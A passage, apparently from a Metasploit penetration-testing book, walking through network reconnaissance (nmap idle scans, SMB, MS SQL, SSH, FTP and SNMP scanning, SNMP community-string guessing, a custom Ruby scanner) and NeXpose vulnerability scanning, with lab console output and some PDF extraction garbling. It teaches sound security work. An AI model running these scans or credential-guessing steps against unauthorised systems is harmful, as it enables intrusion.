+msf > db_connect postgres:toor@127.0.0.1/msf3
+msf > db_import Subnet1.xml
+msf > db_hosts -c address
+Hosts
+=====
+address       -------       192.168.1.1   
+192.168.1.10  
+192.168.1.101 192.168.1.102 192.168.1.109 192.168.1.116 192.168.1.142 192.168.1.152 192.168.1.154 192.168.1.171 192.168.1.155 192.168.1.174 192.168.1.180 192.168.1.181 192.168.1.2   192.168.1.99  
+msf >
+
+22 Chapter 3This tells us that we’ve successfully imported the output of our nmap  
+scans into Metasploit, as evidenced by  the IP addresses populated when we 
+run the db_hosts  commands.
+Advanced Nmap Scanning: TCP Idle Scan
+A more advanced nmap  scan method, TCP idle scan , allows us to scan a target 
+stealthily by spoofing the IP address of  another host on the network. For this 
+type of scan to work, we first need to locate an idle host on the network that 
+uses incremental IP IDs (which are us ed to track packet order). When we 
+discover an idle system that uses incr emental IP IDs, the IP IDs become pre-
+dictable, and we can then predict the next ID. However, when spoofing the 
+address of an idle host while scanning a target’s responses from open ports, 
+we can see a break in the predictability  of the IP ID sequence, which indi-
+cates that we have discovered an open  port. (To learn more about this mod-
+ule and IP ID sequences, visit http://www.metasploit.com/modules/auxiliary/
+scanner/ip/ipidseq/ .)
+Use the Framework’s scanner/ip/ipidseq  module to scan for a host that fits 
+the TCP idle scan requirements, as shown next:
+msf > use auxiliary/scanner/ip/ipidseq
+msf auxiliary(ipidseq) > show options
+Module options:   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------   GWHOST                      no        The gateway IP address   INTERFACE                   no        The name of the interface   LHOST                       no        The local IP address
+X RHOSTS                      yes       The target address range or CIDR identifier
+   RPORT      80               yes       The target port   SNAPLEN    65535            yes       The number of bytes to capture
+Y THREADS    1                yes       The number of concurrent threads
+   TIMEOUT    500              yes       The reply read timeout in milliseconds
+This listing displays the required options for the ipidseq  scan. One notable 
+one, RHOSTS  at X, can take IP ranges (such as 192.168.1.20–192.168.1.30); 
+Classless Inter-Domain Routing (CIDR)  ranges (such as 192.168.1.0/24); 
+multiple ranges separated by commas (s uch as 192.168.1.0/24, 192.168.3.0/24); 
+and a text file with one host per line (such as file:/tmp/hostlist.txt ). All these 
+options give us quite a bit of flex ibility in specifying our targets.
+The THREADS  value at Y sets the number of concurrent threads to use 
+while scanning. By default, all scanner modules have their THREADS  value initially 
+set to 1. We can raise this value to sp eed up our scans or lower it to reduce 
+network traffic. In general, you should not set the THREADS  value greater 16 
+when running Metasploit on Windows, and not greater than 128 on UNIX-
+like operating systems.
+
+Intelligence Gathering 23Now let’s set our values and run the module. We’ll set the value for RHO-
+STS to 192.168.1.0/24, set THREADS  to 50, and then run the scan.
+msf auxiliary(ipidseq) > set RHOSTS 192.168.1.0/24
+RHOSTS => 192.168.1.0/24msf auxiliary(ipidseq) > set THREADS 50
+THREADS => 50
+msf auxiliary(ipidseq) > run
+[*] 192.168.1.1's IPID sequence class: All zeros
+[*] 192.168.1.10's IPID sequence class: Incremental![*] Scanned 030 of 256 hosts (011% complete)[*] 192.168.1.116's IPID sequence class: All zeros
+X [*] 192.168.1.109's IPID sequence class: Incremental!
+[*] Scanned 128 of 256 hosts (050% complete)[*] 192.168.1.154's IPID sequence class: Incremental![*] 192.168.1.155's IPID sequence class: Incremental![*] Scanned 155 of 256 hosts (060% complete)[*] 192.168.1.180's IPID sequence class: All zeros[*] 192.168.1.181's IPID sequence class: Incremental![*] 192.168.1.185's IPID sequence class: All zeros[*] 192.168.1.184's IPID sequence class: Randomized[*] Scanned 232 of 256 hosts (090% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed
+msf auxiliary(ipidseq) >
+Judging by the results of our scan, we see a number of potential idle hosts 
+that we can use to perform idle scanni ng. We’ll try scanning a host using the 
+system at 192.168.1.109 shown at X by using the -sI command line flag to 
+specify the idle host:
+msf auxiliary(ipidseq) > nmap -PN -sI 192.168.1.109 192.168.1.155
+[*] exec: nmap -PN -sI 192.168.1.109 192.168.1.155
+Idle scan using zombie 192.168.1.109 (192.168.1.109:80); Class: Incremental
+Interesting ports on 192.168.1.155:Not shown: 996 closed|filtered portsPORT    STATE SERVICE135/tcp open  msrpc139/tcp open  netbios-ssn445/tcp open  microsoft-dsMAC Address: 00:0C:29:E4:59:7C (VMware)Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds
+msf auxiliary(ipidseq) >
+By using the idle host, we were able to discover a number of open ports 
+on our target system without sendin g a single packet to the system.
+
+24 Chapter 3Running Nmap from MSFconsole
+Now that we’ve performed advanced enum eration on our target, let’s connect 
+nmap  with Metasploit. To do this, we first connect to the msfbook  database:
+msf > db_connect postgres:toor@127.0.0.1/msf3
+Now we should be able to enter the db_nmap  command from within 
+msfconsole  to run nmap  and have its results automa tically stored in our new 
+database.
+NOTE We’ll be attacking only one system in this  instance, but you can specify IPs by CIDR 
+notation and even ranges (for example, 192.168.1.1/24 or 192.168.1.1–254).
+msf > db_nmap -sS -A 172.16.32.131
+Warning: Traceroute does not support idle or connect scan, disabling...
+Nmap scan report for 172.16.32.131Host is up (0.00056s latency).Not shown: 990 closed portsPORT     STATE SERVICE       VERSION21/tcp Xopen  ftp           Microsoft ftpd
+25/tcp   open  smtp          Microsoft ESMTP 6.0.2600.2180 Y
+80/tcp   open  http          Microsoft IIS webserver 5.1|_html-title:135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn443/tcp  open  https?445/tcp  open  microsoft-ds  Microsoft Windows XP microsoft-ds1025/tcp open  msrpc         Microsoft Windows RPC1433/tcp open  ms-sql-s      Microsoft SQL Server 2005 9.00.1399; RTM3389/tcp open  microsoft-rdp Microsoft Terminal ServiceMAC Address: 00:0C:29:EA:26:7C (VMware)Device type: general purposeRunning: Microsoft Windows XP|2003 Z
+OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003Network Distance: 1 hopService Info: Host: ihazsecurity; OS: Windows
+Host script results:
+|_nbstat: NetBIOS name: IHAZSECURITY, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:ea:26:7c| smb-os-discovery:|   OS: Windows XP (Windows 2000 LAN Manager)|   Name: WORKGROUP\IHAZSECURITY|_smbv2-enabled: Server doesn't support SMBv2 protocol
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/.
+Nmap done: 1 IP address (1 host up) scanned in 33.51 seconds
+Notice a series of open ports X, software versions Y, and even a predic-
+tion about the target’s operating system Z.
+
+Intelligence Gathering 25To check that the results from the sc an are stored in the database, we 
+run db_services :
+msf > db_services
+Services========
+host            port   proto  name          state  info
+----            ----   -----  ----          -----  ----172.16.32.131   135 tcp  msrpc      open   Microsoft Windows RPC172.16.32.131   139 tcp  netbios-ssn  open  172.16.32.131   445 tcp  microsoft-ds open   Microsoft Windows XP microsoft-ds172.16.32.131   777 tcp  unknown     open
+172.16.32.131   1433 tcp ms-sql-s open   Microsoft SQL Server 2005 9.00.1399; RTM
+We’re beginning to develop a picture of our target and exposed ports for 
+use as potential attack vectors.
+Port Scanning with Metasploit
+In addition to its ability to use thir d-party scanners, Metasploit has several 
+port scanners built into its auxiliary mo dules that directly integrate with most 
+aspects of the Framework. In later chapters, we’ll use these port scanners to leverage compro mised systems to access and atta ck; his process,  often called 
+pivoting , allows us to use internally connected systems to route traffic to a net-
+work that would otherwise be inaccessible.
+For example, suppose you compromise a system behind a firewall that is 
+using Network Address Translation (NAT ). The system behind the NAT-based 
+firewall uses private IP addresses, whic h you cannot contact directly from the 
+Internet. If you use Metasp loit to compromi se a system behind a NAT, you 
+might be able to use that  compromised intern al system to pass traffic (pivot) 
+to internally hosted and private IP-b ased systems to penetrate the network 
+farther behind the firewall.
+To see the list of port scanning tool s that the Framework offers, enter the 
+following:
+msf > search portscan
+Let’s conduct a simple scan of a sing le host using Metasploit’s SYN Port 
+Scanner. In the following listing, we start the scan with use scanner/portscan/
+syn, set RHOSTS  to 192.168.1.155, set THREADS  to 50, and then run the scan.
+msf > use scanner/portscan/syn
+msf auxiliary(syn) > set RHOSTS 192.168.1.155
+RHOSTS => 192.168.1.155msf auxiliary(syn) > set THREADS 50
+THREADS => 50
+
+26 Chapter 3msf auxiliary(syn) > run
+X [*]  TCP OPEN 192.168.1.155:135
+[*]  TCP OPEN 192.168.1.155:139[*]  TCP OPEN 192.168.1.155:445[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed
+msf auxiliary(syn) >
+From the results, you can see at X that ports 135, 139, and 445 are open on 
+IP address 192.168.1.155, leveraging the portscan  syn module within Metasploit.
+Targeted Scanning
+When you are conducting a penetration test, there is no shame in looking 
+for an easy win. A targeted scan  looks for specific oper ating systems, services, 
+program versions, or configurations th at are known to be  exploitable and 
+that provide an easy door into a target  network. For example, it is common 
+to scan a target network quickly for th e vulnerability MS08-067, as this is 
+(still) an extremely common hole that will give you SYSTEM access much more quickly than scanning an entire  target network for vulnerabilities.
+Server Message Block Scanning
+Metasploit can scour a network and attempt to identify versions of Microsoft 
+Windows using its smb_version  module.
+NOTE If you are not familiar with Server Message Block (SMB, a common file-sharing protocol), 
+study up a bit on the different protocols an d their purposes before you continue. You will 
+need to understand basic port information to learn how to attack a system successfully.
+We run the module, li st our options, set RHOSTS , and begin scanning:
+msf > use scanner/smb/smb_version
+msf auxiliary(smb_version) > show options
+Module options:   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------   RHOSTS                    yes       The target address range or CIDR identifier   THREADS  1                yes       The number of concurrent threads
+msf auxiliary(smb_version) > set RHOSTS 192.168.1.155
+RHOSTS => 192.168.1.155msf auxiliary(smb_version) > run
+X [*] 192.168.1.155 is running Windows XP Service Pack 2 (language: English) 
+(name:DOOKIE-FA154354) (domain:WORKGROUP)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+Intelligence Gathering 27As you can see at X the smb_version  scanner has pinpointed the operating 
+system as Windows XP with Service Pack  2. Because we are scanning only one 
+system, we leave THREADS  set to 1. If we had been sc anning a number of systems, 
+such as a class C subnet range, we might consider upping the THREADS  using the 
+set THREADS number  option. The results of this scan  are stored in the Metasploit 
+database for use at a later time  and to be accessed with the db_hosts  command.
+msf auxiliary(smb_version) > db_hosts -c address,os_flavor
+Hosts
+=====
+address        os_flavor   Svcs  Vulns  Workspace
+-------        ---------   ----  -----  ---------192.168.1.155  Windows XP  3     0      default
+msf auxiliary(smb_version) >
+We have discovered a system running  Windows XP without having to do 
+a full scan of the network. This is a grea t way to target hosts quickly and quietly 
+that are likely to be more vulnerable  when our goal is avoid being noticed.
+Hunting for Poorly Configured Microsoft SQL Servers
+Poorly configured Microsoft SQL Server  (MS SQL) installations often provide 
+an initial way into a target network. In  fact, many system administrators don’t 
+even realize that they have MS SQL serv ers installed on their workstations at 
+all, because the service is installed as a prerequisite for some common soft-
+ware, such as Microsoft Visual Studio.  These installations are often unused, 
+unpatched, or neve r even configured.
+When MS SQL is installed, it listens by default either on TCP port 1433 
+or on a random dynamic TCP port. If MS SQL is listening on a dynamic port, simply query UDP port 1434 to discov er on what dynamic TCP port MS SQL 
+is listening. Of course, Metasploit has a module that can make use of this 
+“feature”: mssql_ping.
+Because mssql_ping  uses UDP, it can be quite slow to run across entire 
+subnets because of issues with time outs. But on a local LAN, setting 
+THREADS  
+to 255 will greatly speed up the scan. As  Metasploit finds MS SQL servers, it 
+displays all the details it can extract from them including, perhaps most impor-
+tantly, the TCP port on which the server is listening.
+Here’s how you might run an mssql_ping  scan, which includes starting the 
+scan, listing and setting options, and the results.
+msf > use scanner/mssql/mssql_ping
+msf auxiliary(mssql_ping) > show options
+Module options:
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    no        The password for the specified username   RHOSTS                      yes       The target address range or CIDR identifier
+
+28 Chapter 3   THREADS    1                yes       The number of concurrent threads
+   USERNAME   sa               no        The username to authenticate as   WORKSPACE                   no        The name of the workspace to report data into
+msf auxiliary(mssql_ping) > set RHOSTS 192.168.1.0/24
+RHOSTS => 192.168.1.0/24msf auxiliary(mssql_ping) > set THREADS 255
+THREADS => 255msf auxiliary(mssql_ping) > run
+X [*] SQL Server information for 192.168.1.155:
+[*]    ServerName      = V-XPSP2-BARE
+Y [*]    InstanceName    = SQLEXPRESS
+[*]    IsClustered     = No
+Z [*]    Version         = 10.0.1600.22
+[ [*]    tcp             = 1433
+As you can see, not only does the scanner locate a MS SQL server at X, 
+but it also identifies the instance name at Y, the SQL server version at Z, and 
+the TCP port number at [ on which it is listening. Just think of how much 
+time this targeted scan for SQL servers would save over running nmap  against 
+all ports on all machines in a target su bnet in search of the elusive TCP port.
+SSH Server Scanning
+If during your scanning you encounter machines running Secure Shell (SSH), 
+you should determine which version is ru nning on the target . SSH is a secure 
+protocol, but vulnerabilities in various implementations have  been identified. 
+You never know when you might get lu cky and come across an old machine 
+that hasn’t been updated. You can use the Framework’s ssh_version  module to 
+determine the SSH version running on the target server.
+msf > use scanner/ssh/ssh_version
+msf auxiliary(ssh_version) > set THREADS 50
+THREADS => 50
+msf auxiliary(ssh_version) > run
+[*] 192.168.1.1:22, SSH server version: SSH-2.0-dropbear_0.52
+[*] Scanned 044 of 256 hosts (017% complete)
+[*] 192.168.1.101:22, SSH server version: SSH-2.0-OpenSSH_5.1p1 Debian-3ubuntu1[*] Scanned 100 of 256 hosts (039% complete)
+[*] 192.168.1.153:22, SSH server version: SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1
+[*] 192.168.1.185:22, SSH server version: SSH-2.0-OpenSSH_4.3
+This output tells us that a few diffe rent servers are running with various 
+patch levels. This information could prove useful if, for example, we wanted to attack a specific version of OpenSSH as found with the ssh_version  scan.
+
+Intelligence Gathering 29FTP Scanning
+FTP is a complicated and insecure prot ocol. FTP servers are often the easiest 
+way into a target network, and you should always scan for, identify, and finger-print any FTP servers ru nning on your target.
+Next, we scan our XP box for FT P services using the Framework’s 
+ftp_version module:
+msf > use scanner/ftp/ftp_version
+msf auxiliary(ftp_version) > show options
+Module options:   Name       Current Setting      Required  Description
+   ----       ---------------      --------  -----------   FTPPASS    mozilla@example.com  no        The password for the specified username   FTPUSER    anonymous            no        The username to authenticate as   RHOSTS                          yes       The target address range or CIDR identifier   RPORT      21                   yes       The target port   THREADS    1                    yes       The number of concurrent threads   WORKSPACE                       no        The name of the workspace to report data into
+msf auxiliary(ftp_version) > set RHOSTS 192.168.1.0/24
+RHOSTS => 192.168.1.0/24msf auxiliary(ftp_version) > set THREADS 255
+THREADS => 255msf auxiliary(ftp_version) > run
+X [*] 192.168.1.155:21 FTP Banner: Minftpd ready
+The scanner successfully identifies an FTP server at X. Now let’s see if 
+this FTP server allows anonymous logins using the Framework’s scanner/ftp/
+anonymous .
+msf > use auxiliary/scanner/ftp/anonymous
+msf auxiliary(anonymous) > set RHOSTS 192.168.1.0/24
+RHOSTS => 192.168.1.0/24msf auxiliary(anonymous) > set THREADS 50
+THREADS => 50msf auxiliary(anonymous) > run
+[*] Scanned 045 of 256 hosts (017% complete)
+X [*] 192.168.1.155:21 Anonymous READ/WRITE (220 Minftpd ready)
+The scanner reports at X that anonymous access is allowed and that 
+anonymous users have both read and wr ite access to the server; in other 
+words, we have full access to the remote  system and the ability to upload or 
+download any file that can be ac cessed by the FTP server software.
+
+30 Chapter 3Simple Network Manage ment Protocol Sweeping
+The Simple Network Management Protocol  (SNMP) is typically used in net-
+work devices to report information su ch as bandwidth utilization, collision 
+rates, and other information. However, some operating systems also have SNMP servers that can provide information such as CPU utilization, free memory, and other system-specific details.
+Convenience for the system administ rator can be a gold mine for the 
+penetration tester, and accessible SNMP servers can offer considerable infor-
+mation about a specific system or ev en make it possible to compromise a 
+remote device. If, for instance, you ca n get the read/write SNMP community 
+string for a Cisco router, you can download the router’s entire configuration, modify it, and upload it back to the router.
+The Metasploit Framework includes a built-in auxiliary module called 
+scanner/snmp/snmp_enum  that is designed specifica lly for SNMP sweeps. Before 
+you start the scan, keep in mind that the read-only (RO) and read/write (RW) 
+community strings will play an importan t role in the type of information you 
+will be able to extract from a give n device. On Window s-based devices con-
+figured with SNMP, you can often use the RO or RW community strings to extract patch levels, runni ng services, usernames, uptime, routes, and other 
+information that can make things much  easier for you during a pen test. 
+(Community strings  are essentially passwords used to query a device for infor-
+mation or to write configuration information to the device.)
+After you guess the community strings,  SNMP itself (depending on the 
+version) can allow anything from excessi ve information disclosure to full sys-
+tem compromise. SNMPv1 an d v2 are inherently flaw ed protocols. SNMPv3, 
+which incorporates encryption and bett er check mechanisms, is significantly 
+more secure. To gain access to a switch, you’ll first need to attempt to find its 
+community strings. The Framework’s use scanner/snmp/snmp_login module 
+will try a word list against on e or a range of IP addresses.
+msf > use use scanner/snmp/snmp_login
+msf auxiliary(snmp_login) > set RHOSTS 192.168.1.0/24
+RHOSTS => 192.168.1.0/24msf auxiliary(snmp_login) > set THREADS 50
+THREADS => 50msf auxiliary(snmp_login) > run
+[*] >> progress (192.168.1.0-192.168.1.255) 0/30208...
+X [*] 192.168.1.2 'public' ' GSM7224 L2 Managed Gigabit Switch'
+Y [*] 192.168.1.2 'private' 'GSM7224 L2 Managed Gigabit Switch'
+[*] Auxiliary module execution completed
+msf auxiliary(snmp_login) >
+A quick Google search for GSM7224  from the output tells us that the 
+scanner has found both the public X and private Y community strings for a 
+Netgear switch. This result, believe it or not, has not been staged for this book. 
+These are the default factory settings for this switch.
+
+Intelligence Gathering 31You will encounter many jaw-dropping  situations like these throughout 
+your pen testing career, because many admi nistrators simply attach devices to a 
+network with all their defaults still in pl ace. The situation is even scarier when 
+you find these devices acce ssible from the Internet within a large corporation.
+Writing a Custom Scanner
+Many applications and services lack custom modules in Metasploit. Thank-
+fully, the Framework has ma ny features that can be useful when you’re build-
+ing a custom scanner, including offering  access to all of its exploit classes 
+and methods, and support for proxies, Secure Sockets Layer (SSL), report-
+ing, and threading. It can be very us eful to write your own scanner during 
+security assessments, because doing so wi ll allow you to locate every instance 
+of a bad password or unpatched service quickly on a target system.
+The Metasploit Framework scanner modul es include various mixins, such as 
+exploit mixins for TCP, SMB, and so on, and the auxiliary scanner  mixin that 
+is built into the Framework. Mixins  are portions of code with predefined 
+functions and calls that are preconfigured for you. The Auxiliary::Scanner  
+mixin overloads the Auxiliary run method; calls the module method at runt-
+ime with run_host(ip) , run_range(range) , or run_batch(batch) ; and then pro-
+cesses the IP addresses. We can leverage Auxiliary::Scanner  to call additional, 
+built-in Metasploit functionality.
+Following is a Ruby script  for a simple TCP scanner that will connect to a 
+remote host on a default port of 12345 and upon connecting, send “HELLO SERVER,” receive the server response, an d print it out along with the server’s 
+IP address.
+#Metasploit
+require 'msf/core'class Metasploit3 < Msf::Auxiliary
+Xinclude Msf::Exploit::Remote::Tcp
+Yinclude Msf::Auxiliary::Scanner
+        def initialize                super(                        'Name'           => 'My custom TCP scan',                        'Version'        => '$Revision: 1 $',                        'Description'    => 'My quick scanner',                        'Author'         => 'Your name here',                        'License'        => MSF_LICENSE                )                register_options(                        [                                ZOpt::RPORT(12345)
+                        ], self.class)        end
+
+32 Chapter 3        def run_host(ip)
+                connect()
+[sock.puts('HELLO SERVER')
+                data = sock.recv(1024)
+\print_status("Received: #{data} from #{ip}")
+                disconnect()        end
+end
+This simple scanner uses the Msf::Exploit::Remote::Tcp  X mixin to handle 
+the TCP networking, and the Msf::Auxiliary::Scanner  mixin exposes the vari-
+ous settings that are required fo r scanners within the Framework Y. This 
+scanner is configured to use the default port of 12345 Z, and upon connect-
+ing to the server, it sends a message [, receives the reply from the server, and 
+then prints it out to the screen along with the server IP address \.
+We have saved this custom script under modules/auxiliary/scanner/ as 
+simple_tcp.rb . The saved location is important in Metasploit. For example, if 
+the module is saved under modules/auxiliary/scanner/http/ , it would show up 
+in the modules list as scanner/http/simple_tcp .
+To test this rudimentary scanner, we set up a netcat  listener on port 12345 
+and pipe in a text file to act as the server response.
+root@bt:/# echo "Hello Metasploit" > banner.txt
+root@bt:/# nc -lvnp 12345 < banner.txt
+listening on [any] 12345...
+Next, we load up msfconsole , select our sc anner module, set its param-
+eters, and run it to  see if it works.
+msf > use auxiliary/scanner/simple_tcp
+msf auxiliary(simple_tcp) > show options
+Module options:   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------   RHOSTS                    yes       The target address range or CIDR identifier   RPORT    12345            yes       The target port   THREADS  1                yes       The number of concurrent threads
+msf auxiliary(simple_tcp) > set RHOSTS 192.168.1.101
+RHOSTS => 192.168.1.101msf auxiliary(simple_tcp) > run
+[*] Received: Hello Metasploit from 192.168.1.101
+[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed
+msf auxiliary(simple_tcp) >
+
+Intelligence Gathering 33Although this is only a simple example, the level of versatility afforded by 
+the Metasploit Framework can be of gr eat assistance when  you need to get 
+some custom code up and running quickl y in the middle of a pen test. Hope-
+fully, this simple example demonstr ates the power of the Framework and 
+modular code. But, of course, you don’ t have to do everything by hand.
+Looking Ahead
+In this chapter, you learned how to  leverage the Metasploit Framework 
+for intelligence gathering, as outlined  in the PTES. Intelligence gathering 
+takes practice and requires a deep un derstanding of how an organization 
+operates and how to identify the best potential attack vectors. As with any-
+thing, you should adapt and improve your own methodologies throughout your penetration-testing career. Just re member that your main focus for this 
+phase is to learn about the organization  you’re attacking and its overall foot-
+print. Regardless of whether your work occurs over the Internet, on an inter-
+nal network, wirelessly, or via social engineering, the goals of intelligence 
+gathering will always be the same.
+In the next chapter, we’ll move on to another important step during the 
+vulnerability analysis phase: automated vulnerability scanning. In later chap-
+ters, we will explore more in-depth exam ples of how to create your own mod-
+ules, exploits, and Meterpreter scripts.
+
+VULNERABILITY SCANNING
+A vulnerability scanner  is an automated program 
+designed to look for weak nesses in computers, com-
+puter systems, networks, and applications. The pro-
+gram probes a system by sending data to it over a network and analyzing the re sponses received, in an 
+effort to enumerate any vu lnerabilities present on the 
+target by using its vulnerab ility database as reference.
+Various operating systems tend to resp ond differently when sent particular 
+network probes because of the different networking implementations in use. These unique responses serve as a fing erprint that the vulnerability scanner 
+uses to determine the operating system  version and even its patch level. A 
+vulnerability scanner can also use a given set of user credentials to log into the remote system and enumerate the software and services to determine 
+whether they are patched. With the resu lts it obtains, the scanner presents a 
+report outlining any vulnerabilities dete cted on the system. That report can 
+be useful for both network administrators and penetration testers.
+
+36 Chapter 4Vulnerability scanners generally create  a lot of traffic on a network and 
+are therefore not typically used in a penetration test when one of the objec-tives is to remain undetected. If, howe ver, you are running a penetration test 
+and stealth is not an issue, a vulnerab ility scanner can save you from having 
+to probe systems ma nually to determine their pa tch levels and vulnerabilities.
+Whether you use an automated scanner or do it manually, scanning is 
+one of the most important steps in the penetration testing process; if done 
+thoroughly, it will provide the best value to your client. In this chapter, we 
+will discuss a number of vulnerability scan ners and how they can be integrated 
+within Metasploit. We’ll highlight some  auxiliary modules in the Metasploit 
+Framework that can locate specific  vulnerabilities in remote systems.
+The Basic Vulnerability Scan
+Let’s look at how a scan works at the most  basic level. In the following listing, 
+we use netcat  to grab a banner from the target 192.168.1.203. Banner grabbing  
+is the act of connecting to a remote network service and reading the service 
+identification (banner) that is returned . Many network services such as web, 
+file transfer, and mail se rvers return their banner either immediately upon 
+connecting to them or in response to a specific command. Here we connect 
+to a web server on TCP port 80 and issue a GET HTTP  request that allows us to 
+look at the header information that the remote server return s in response to 
+our request.
+root@bt:/opt/framework3/msf3# nc 192.168.1.203 80
+GET HTTP 1/1HTTP/1.1 400 Bad Request
+X Server: Microsoft-IIS/5.1
+The information returned at X tells us that the system running on port 80 
+is a Microsoft IIS 5.1–based web server. Armed with this info rmation, we could 
+use a vulnerability scanner, as shown in Figure 4-1, to determine whether this 
+version of IIS has any vulnerabilities a ssociated with it and whether this par-
+ticular server has been patched.
+Of course, in practice, it’s not that  simple. Vulnerabili ty scans often con-
+tain many false positives  (reported vulnerability where none exists) and false 
+negatives  (failure to log a vulnerability wh ere one exists) due to subtle differ-
+ences in system and application configurat ions. In addition, the creators of vul-
+nerability scanners have an incentive to  report positives: The more “hits” a 
+vulnerability scanner finds, the better it looks to a potent ial buyer. Vulnera-
+bility scanners are only as good as th eir vulnerabilities database, and they can 
+easily be fooled by misleading banne rs or inconsistent configurations.
+Let’s take a look at some of the more useful vulnerability scanners, 
+including NeXpose, Nessus, an d some specialized scanners.
+
+Vulnerability Scanning 37Figure 4-1: Vulnerability scan results against the target web server
+Scanning with NeXpose
+NeXpose is Rapid7’s vulnerability scan ner that scans networks to identify 
+the devices running on them and perfor ms checks to identify security weak-
+nesses in operating systems and applicat ions. It then analyzes the scan data 
+and processes it for inclusion in various reports.
+Rapid7 offers multiple versions of NeXpose, but we’ll use the Community 
+edition because it’s free. If you plan  to use NeXpose commercially, see the 
+Rapid7 site ( http://www.rapid7.com/vulnerability-scanner.jsp ) for information 
+on the various versions and th eir capabilities and pricing.
+Our target for scanning will be a de fault installation of Windows XP SP2 
+as configured in Appendix A. We will first perform a basic overt scan of our 
+target and import the vuln erability scan results into  Metasploit. We will close 
+out this section by showing you how to run a NeXpose vulnerability scan directly from msfconsole  rather than using the web-based GUI, eliminating the 
+need to import a scan report.
+Configuration
+After installing NeXpose Community, open a web browser and navigate to 
+https://<youripaddress>:3780 . Accept the NeXpose self -signed certificate, and 
+log in using the credential s you created during setup. You should next be 
+presented with an interface similar to the one shown in Figure 4-2. (You’ll 
+find complete installation instructions  for NeXpose at the Rapid7 website.)
+On the NeXpose main page, you will notice a number of tabs at the top 
+of the interface:
+zThe Assets tab X displays details of computers and other devices on your 
+network after they have been scanned.
+zThe Reports tab Y lists vulnerability scan reports after they have been 
+generated.
+zThe Vulnerabilities tab Z gives you details on any vulnerabilities discov-
+ered during your scans.
+zThe Administration tab [ allows you to configure various options.
+
+
+38 Chapter 4Figure 4-2: The NeXpos e’s initial home screen
+Buttons in the main body of the page let you perform common tasks 
+such as creating a new site or setting up a new vulnerability scan.
+The New Site Wizard
+Prior to running a vulnerability scan wi th NeXpose, you need to configure a 
+site—a logical collection of devices such as a specific subnet, a collection of 
+servers, or even a single workstation. These sites will then be scanned by NeXpose, and different scan types can be defined for a particular site.
+1. To create a site, click the New Site  button on the NeXpose home page, 
+enter a name for your site and a brief description, and then click Next .
+2. In the devices step, shown in Figure 4-3, you have quite a bit of granular-
+ity in defining your targets. You can add a single IP address, address ranges, hostnames, and more. You can also decl are devices, such as printers, to 
+exclude from scans. (Printers frequently  don’t take kindly to being scanned. 
+We have seen instances in which a si mple vulnerability scan caused more 
+than one million pages of pure black to  be placed in the queue to print!) 
+Click Next  when you have finished ad ding and excluding devices.
+3. At the scan setup step, you can ch oose from several different scan tem-
+plates, such as Discovery Scan and Pe netration test; select the scanning 
+engine you want to use; or set up an automated scanning schedule. For 
+purposes of this initial walk-through , keep the default selections and 
+click Next  to continue.
+4. Add credentials for the site you want to scan, if you have  them. Credentials 
+can help create more accurate and complete results by  performing in-
+depth enumeration of installed software and system policies on the target. 
+5. On the Credentials tab, click the New Login  button, type a username 
+and password for the IP address you want to scan, and then click Test 
+Login  to verify your credentials then save them.
+/oneinv/twoinv/threeinv/fourinv
+
+Vulnerability Scanning 39Figure 4-3: Adding a device to the new NeXpose site
+6. Last, click Save to complete the New Site wizard and return to the Home 
+tab, which should list your newly added site, as shown in Figure 4-4.
+Figure 4-4: The Home tab show s the newly configured site.
+The New Manual Scan Wizard
+With your new site configured, you are now set to configure your first scan:
+1. Click the New Manual Scan  button shown in Figure 4-4. You should see 
+the Start New Scan dialog shown in Fi gure 4-5, which prompts you for the 
+assets you want to scan or exclude. In this example, we are scanning our 
+default Windows XP system.
+2. Double-check your target IP address to be sure that you’re not about to 
+scan the wrong device or networ k inadvertently, and click the Start Now  
+button to begin.
+
+
+40 Chapter 4Figure 4-5: The NeXpose scan configuration dialog
+3. NeXpose should dynamically refresh the page as the scan progresses. 
+Wait until the status for both Scan Progress and Discovered Assets shows 
+Completed , as shown in Figure 4-6. Under the Scan Progress section, you 
+can see that our single scanned devi ce has 268 vulnerabilities detected, 
+and under Discovered Assets, you ar e provided with more information 
+about the target such as the device  name and its operating system. Now 
+click the Reports  tab.
+Figure 4-6: The completed NeXpose scan and report
+
+
+Vulnerability Scanning 41The New Report Wizard
+If this is your first time running NeXpose and you have completed only one 
+scan, the Reports tab should show th at you have gene rated no reports.
+1. Click New Report , as shown in Figure 4-7, to start the New Report wizard.
+Figure 4-7: The Ne Xpose Reports tab
+2. Enter a friendly name, and then in  the Report format field, select NeXpose 
+Simple XML Export , as shown in Figure 4-8, so that you will be able to 
+import the scan results into Metasploit . You can select from different report 
+templates and configure the time zone  if you happen to be conducting 
+your pen test on the road. Click Next  when you are ready to proceed.
+Figure 4-8: Selecting a name and format for the report
+3. In the subsequent wind ow, add the devices you want to be included in 
+the report by clicking Select Sites  to add your scanned target range, as 
+shown in Figure 4-9. Then click Save .
+Figure 4-9: Selecting the site  for inclusion in the report
+
+
+42 Chapter 44. In the Select Devices dialog, select the targets to include in your report 
+and then click Save .
+5. Back in the Report Configuration wizard, click Save to accept the remaining 
+defaults for the report. The Reports tab should now list the newly created 
+report, as shown in Figure 4-10. (Be sure to save the report file so that you can use it with the Framework.)
+Figure 4-10: The Reports tab lists your reports.
+Importing Your Report into the Metasploit Framework
+Having completed a full vulnerability scan with NeXpose, you need to import 
+the results into Metasploit. But before you do, you must create a new database 
+from msfconsole  by issuing db_connect . After creating that database you’ll import 
+the NeXpose XML using the db_import  command. Metasploit will automati-
+cally detect that the file is from NeXpose and import the scanned host. You can then verify that the import  was successful by running the 
+db_hosts  command. 
+(These steps are shown in the follo wing listing.) As you can see at X, Metasploit 
+knows about the 268 vulnerabilit ies that your scan picked up.
+msf > db_connect postgres:toor@127.0.0.1/msf3
+msf > db_import /tmp/host_195.xml
